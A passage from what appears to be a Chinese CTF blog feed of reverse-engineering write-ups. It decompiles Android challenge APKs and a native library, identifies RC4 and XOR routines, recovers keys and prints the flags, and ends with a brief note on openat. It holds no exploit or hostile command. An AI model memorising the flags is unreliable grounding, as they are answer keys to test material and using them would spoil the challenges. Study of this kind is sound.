<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">hide_key</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = key;</span><br><span class="line">  key[<span class="number">0</span>] ^= <span class="number">0x47</span>u;</span><br><span class="line">  key[<span class="number">1</span>] ^= <span class="number">0x32</span>u;</span><br><span class="line">  key[<span class="number">2</span>] ^= <span class="number">0x11</span>u;</span><br><span class="line">  key[<span class="number">3</span>] ^= <span class="number">0x12</span>u;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*********************************************其通过下面的代码自启动************************************************/</span></span><br><span class="line">.init_array:<span class="number">00001</span>EB0 _init_array     segment dword <span class="keyword">public</span> <span class="string">&#x27;DATA&#x27;</span> use32</span><br><span class="line">.init_array:<span class="number">00001</span>EB0                 assume cs:_init_array</span><br><span class="line">.init_array:<span class="number">00001</span>EB0                 ;org <span class="number">1</span>EB0h</span><br><span class="line">.init_array:<span class="number">00001</span>EB0                 dd offset _Z8hide_keyv  ; <span class="built_in">hide_key</span>(<span class="type">void</span>)</span><br><span class="line">.init_array:<span class="number">00001</span>EB0 _init_array     ends</span><br><span class="line"><span class="comment">/********************************************问了下AI**************************************************************/</span></span><br><span class="line"><span class="comment">/*这段代码是一个在 Linux 系统下的 ELF 可执行文件中 .init_array 节段的汇编源代码。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">.init_array 节段是 ELF 可执行文件中的一个特殊节段，主要用于存储一组函数指针，这些函数指针将在程序运行时自动被调用。具体来说，当程序被加载到内存中并开始运行时，系统会首先调用 .init_array 节段中存储的所有函数指针，以完成程序的初始化工作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">该代码定义了一个包含一个函数指针的 .init_array 节段，并将该函数指针设置为 _Z8hide_keyv，即 hide_key(void) 函数的入口地址。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">在程序运行时，当 .init_array 节段中的函数指针被调用时，程序将会跳转到 hide_key(void) 函数的入口地址，并执行该函数中的代码。该函数可能会对程序进行一些初始化操作，或者执行其他的逻辑代码。由于该函数指针存储在 .init_array 节段中，因此其可以保证在程序运行前被正确地初始化和调用。*/</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [78]: b</span><br><span class="line">Out[78]: [17, 101, 73, 75]</span><br><span class="line"></span><br><span class="line">In [79]: a=[119, 9, 40, 44, 106, 83, 126, 123, 33, 87, 113, 123, 112, 93, 125, 127, 41, 82, 44, 127, 39, 3, 126, 125, 1</span><br><span class="line">    ...: 19, 87, 47, 125, 33, 6, 44, 127, 112, 0, 126, 123, 115, 24]</span><br><span class="line">    ...: for i in range(len(a)):</span><br><span class="line">    ...:     a[i]^=b[i%4]</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [80]: bytes(a).decode()</span><br><span class="line">Out[80]: &#x27;flag&#123;6700280a84487e46f76f2f60ce4ae70b&#125;&#x27;</span><br></pre></td></tr></table></figure></div>

<p>得出了最后的flag</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>鹤城杯 2021 AreYouRich</title>
    <url>/2023/06/07/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%20AreYouRich/</url>
    <content><![CDATA[<p>首先分析androidmanif.xml</p>
<p>有两个activity组件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.test.areyourich&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.AreYouRich&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.test.areyourich.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.test.areyourich.UserActivity&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>MainActivity在启动时进行了如下操作</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        b.c.a.a.f896a = <span class="string">&quot;5FQ5AaBGbqLGfYwjaRAuWGdDvyjbX5nH&quot;</span>;<span class="comment">//修改了下面f896a的值</span></span><br><span class="line">        <span class="built_in">this</span>.o = (EditText) findViewById(R.id.name_et);</span><br><span class="line">        <span class="built_in">this</span>.p = (EditText) findViewById(R.id.pass_et);</span><br><span class="line">        findViewById(R.id.login_btn).setOnClickListener(<span class="keyword">new</span> <span class="title class_">a</span>());<span class="comment">//相当于新建了一个按钮事件</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/************************************************************/</span></span><br><span class="line"><span class="keyword">package</span> b.c.a;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: a */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">f896a</span> <span class="operator">=</span> <span class="string">&quot;secretsecretsecretsecretsecretsecret&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: b */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] f897b = &#123;<span class="number">81</span>, -<span class="number">13</span>, <span class="number">84</span>, -<span class="number">110</span>, <span class="number">72</span>, <span class="number">77</span>, -<span class="number">96</span>, <span class="number">77</span>, <span class="number">32</span>, -<span class="number">115</span>, -<span class="number">75</span>, -<span class="number">38</span>, -<span class="number">97</span>, <span class="number">69</span>, -<span class="number">64</span>, <span class="number">49</span>, <span class="number">8</span>, -<span class="number">27</span>, <span class="number">56</span>, <span class="number">114</span>, -<span class="number">68</span>, -<span class="number">82</span>, <span class="number">76</span>, -<span class="number">106</span>, -<span class="number">34</span>&#125;;</span><br><span class="line">&#125;<span class="comment">//不知道有什么用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>a类是一个内部类</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">a</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        Toast makeText;</span><br><span class="line">        <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.o.getText().toString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">obj2</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.p.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (obj.length() == <span class="number">0</span> || obj2.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            makeText = Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;username or password empty, retry please!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj.length() == <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bArr = &#123;<span class="number">64</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">49</span>&#125;;</span><br><span class="line">            <span class="type">byte</span>[] bytes = obj.getBytes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">                bytes[i] = (<span class="type">byte</span>) (bytes[i] ^ <span class="number">34</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!obj2.equals(<span class="keyword">new</span> <span class="title class_">String</span>(bytes) + <span class="keyword">new</span> <span class="title class_">String</span>(bArr))) &#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;username or password wrong, retry please!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">            Toast.makeText(mainActivity, <span class="string">&quot;Welcome &quot;</span> + obj + <span class="string">&quot; !&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>.getApplicationContext(), UserActivity.class);</span><br><span class="line">            intent.putExtra(<span class="string">&quot;TOKEN&quot;</span>, obj + <span class="string">&quot;_&quot;</span> + obj2 + <span class="string">&quot;_&quot;</span> + System.currentTimeMillis());</span><br><span class="line">            MainActivity.<span class="built_in">this</span>.startActivity(intent);<span class="comment">//intent可以用来传输信息,相当于开启了UserActivity.class这个类型的对象</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            makeText = Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;username or password wrong, retry please!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        makeText.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>UserActivity</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.areyourich;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> a.b.c.h;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadLocalRandom;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserActivity</span> <span class="keyword">extends</span> <span class="title class_">h</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TextView o;</span><br><span class="line">    <span class="keyword">public</span> TextView p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* renamed from: b  reason: collision with root package name */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="comment">/* synthetic */</span> <span class="type">int</span>[] f947b;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="comment">/* synthetic */</span> String c;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">a</span><span class="params">(<span class="type">int</span>[] iArr, String str)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.f947b = iArr;</span><br><span class="line">            <span class="built_in">this</span>.c = str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            String str;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.f947b[<span class="number">0</span>] &lt;= <span class="number">499999999</span>) &#123;</span><br><span class="line">                Toast.makeText(UserActivity.<span class="built_in">this</span>, <span class="string">&quot;sorry, money not enough!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Toast.makeText(UserActivity.<span class="built_in">this</span>, <span class="string">&quot;buy success, eojoy it!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="type">byte</span>[] bArr = &#123;<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>&#125;;</span><br><span class="line">            <span class="type">byte</span>[] bArr2 = &#123;<span class="number">125</span>&#125;;</span><br><span class="line">            <span class="type">byte</span>[] bArr3 = &#123;<span class="number">15</span>, <span class="number">70</span>, <span class="number">3</span>, <span class="number">41</span>, <span class="number">1</span>, <span class="number">48</span>, <span class="number">35</span>, <span class="number">64</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">11</span>, <span class="number">123</span>, <span class="number">52</span>, <span class="number">8</span>, <span class="number">60</span>, <span class="number">119</span>, <span class="number">62</span>, <span class="number">115</span>, <span class="number">73</span>, <span class="number">17</span>, <span class="number">16</span>&#125;;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="built_in">this</span>.c.getBytes();</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">25</span> &gt; bytes.length) &#123;</span><br><span class="line">                str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">                    bArr3[i] = (<span class="type">byte</span>) (bArr3[i] ^ bytes[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                str = <span class="keyword">new</span> <span class="title class_">String</span>(bArr) + <span class="keyword">new</span> <span class="title class_">String</span>(bArr3) + <span class="keyword">new</span> <span class="title class_">String</span>(bArr2);</span><br><span class="line">            &#125;</span><br><span class="line">            UserActivity.<span class="built_in">this</span>.p.setText(str);</span><br><span class="line">            <span class="type">int</span>[] iArr = <span class="built_in">this</span>.f947b;</span><br><span class="line">            iArr[<span class="number">0</span>] = iArr[<span class="number">0</span>] - <span class="number">499999999</span>;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">e</span> <span class="operator">=</span> b.a.a.a.a.e(<span class="string">&quot;Balance: ¥ &quot;</span>);</span><br><span class="line">            e.append(<span class="built_in">this</span>.f947b[<span class="number">0</span>]);</span><br><span class="line">            UserActivity.<span class="built_in">this</span>.o.setText(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*****************************************上面的代码屁用没有********************************************************/</span></span><br><span class="line"><span class="comment">/****************************************通过看wp才晓得这下面的是提示***********************************************/</span>   </span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// a.b.c.h, a.k.a.e, androidx.activity.ComponentActivity, a.h.b.g, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_user);</span><br><span class="line">        <span class="built_in">this</span>.o = (TextView) findViewById(R.id.money_tv);</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.flag_tv);</span><br><span class="line">        <span class="built_in">this</span>.p = (TextView) findViewById(R.id.showflag_tv);</span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> getIntent().getExtras().getString(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line">        <span class="type">int</span>[] iArr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">byte</span>[] bArr = b.c.a.a.f897b;<span class="comment">//密文[51 F3 54 92 48 4D A0 4D 20 8D B5 DA 9F 45 C0 31 08 E5 38 72 BC AE 4C 96 DE]</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = string.getBytes();</span><br><span class="line">        <span class="type">ThreadLocalRandom</span> <span class="variable">current</span> <span class="operator">=</span> ThreadLocalRandom.current();</span><br><span class="line">        <span class="type">byte</span>[] bytes2 = b.c.a.a.f896a.getBytes();<span class="comment">//key 5FQ5AaBGbqLGfYwjaRAuWGdDvyjbX5nH</span></span><br><span class="line">        <span class="type">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line"><span class="comment">/****************************************下面是rc4算法*************************************************************/</span> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            bArr2[i] = (<span class="type">byte</span>) i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bytes2.length == <span class="number">0</span>) &#123;</span><br><span class="line">            bArr2 = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>; i4 &lt; <span class="number">256</span>; i4++) &#123;</span><br><span class="line">                i3 = ((bytes2[i2] &amp; <span class="number">255</span>) + (bArr2[i4] &amp; <span class="number">255</span>) + i3) &amp; <span class="number">255</span>;</span><br><span class="line">                <span class="type">byte</span> <span class="variable">b2</span> <span class="operator">=</span> bArr2[i4];</span><br><span class="line">                bArr2[i4] = bArr2[i3];</span><br><span class="line">                bArr2[i3] = b2;</span><br><span class="line">                i2 = (i2 + <span class="number">1</span>) % bytes2.length;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Math.min(bytes.length, bArr.length);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i8</span> <span class="operator">=</span> <span class="number">0</span>; i8 &lt; min; i8++) &#123;</span><br><span class="line">            i6 = (i6 + <span class="number">1</span>) &amp; <span class="number">255</span>;</span><br><span class="line">            i7 = ((bArr2[i6] &amp; <span class="number">255</span>) + i7) &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">b3</span> <span class="operator">=</span> bArr2[i6];</span><br><span class="line">            bArr2[i6] = bArr2[i7];</span><br><span class="line">            bArr2[i7] = b3;</span><br><span class="line">            i5 = ((<span class="type">byte</span>) (bArr2[((bArr2[i6] &amp; <span class="number">255</span>) + (bArr2[i7] &amp; <span class="number">255</span>)) &amp; <span class="number">255</span>] ^ bytes[i8])) == bArr[i8] ? i5 * <span class="number">2</span> : current.nextInt(<span class="number">10</span>) + i5;</span><br><span class="line">        &#125;</span><br><span class="line">        iArr[<span class="number">0</span>] = i5;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">e</span> <span class="operator">=</span> b.a.a.a.a.e(<span class="string">&quot;Balance: ¥ &quot;</span>);</span><br><span class="line">        e.append(iArr[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">this</span>.o.setText(e.toString());</span><br><span class="line">        findViewById(R.id.buy_btn).setOnClickListener(<span class="keyword">new</span> <span class="title class_">a</span>(iArr, string));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306071740863.png"
                      alt="image-20230607174040767"
                ></p>
<p>进行异或的key&#x3D;vvvvipuser_TTTTKRWQGP@001</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//异或的密文</span></span><br><span class="line">bArr3 = &#123;<span class="number">15</span>, <span class="number">70</span>, <span class="number">3</span>, <span class="number">41</span>, <span class="number">1</span>, <span class="number">48</span>, <span class="number">35</span>, <span class="number">64</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">11</span>, <span class="number">123</span>, <span class="number">52</span>, <span class="number">8</span>, <span class="number">60</span>, <span class="number">119</span>, <span class="number">62</span>, <span class="number">115</span>, <span class="number">73</span>, <span class="number">17</span>, <span class="number">16</span>&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [30]: b=&#x27;vvvvipuser_TTTTKRWQGP@001&#x27;</span><br><span class="line"></span><br><span class="line">In [31]: a=[15, 70, 3, 41, 1, 48, 35, 64, 58, 50, 0, 101, 100, 99, 11, 123, 52, 8, 60, 119, 62, 115, 73, 17, 16]</span><br><span class="line"></span><br><span class="line">In [32]: for i in range(25):</span><br><span class="line">    ...:     a[i]^=ord(b[i])</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [33]: bytes(a).decode()</span><br><span class="line">Out[33]: &#x27;y0u_h@V3_@_107_0f_m0n3y!!&#x27;</span><br></pre></td></tr></table></figure></div>

<p>y0u_h@V3_@_107_0f_m0n3y!!就是flag。。。。。。。。。。。。</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>openat</title>
    <url>/2024/06/07/Pwn/linux/api/openat/</url>
    <content><![CDATA[<p>open函数原型</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int openat(int dirfd, const char *pathname, int flags);</span><br><span class="line">int openat(int dirfd, const char *pathname, int flags, mode_t mode);</span><br></pre></td></tr></table></figure></div>

<p>fd参数如下</p>
<p><a class="link"   href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/include_2uapi_2linux_2fcntl_8h.html" >Linux 内核：include&#x2F;uapi&#x2F;linux&#x2F;fcntl.h 文件参考 (huihoo.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">AT_FDCWD -100</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>api</category>
      </categories>
  </entry>
  <entry>
    <title>鹤城杯 2021designEachStep</title>
    <url>/2023/06/22/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021designEachStep/</url>
    <content><![CDATA[<p>只有一个activity组件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.test.designeachstep&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.DesignEachStep&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.test.designeachstep.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>有一个按钮触发事件（非常长）</p>
